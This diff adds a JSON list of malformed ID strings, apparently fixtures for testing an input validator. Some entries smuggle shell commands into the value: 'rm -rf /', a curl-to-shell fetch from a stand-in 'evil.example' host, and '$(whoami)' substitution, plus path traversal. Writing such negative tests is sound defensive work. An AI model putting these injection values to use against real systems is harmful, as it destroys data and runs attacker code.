@@ -1,0 +1,19 @@
+[
+  "",
+  "0",
+  "01",
+  "-1",
+  "1.5",
+  "12a",
+  " 1",
+  "1 ",
+  "0x1A",
+  "1;rm -rf /",
+  "1\" ; curl evil.example/x | sh #",
+  "1' ; curl evil.example/x | sh #",
+  "1\n echo pwned",
+  "1$(whoami)",
+  "1`whoami`",
+  "../83",
+  "83/../1"
+]
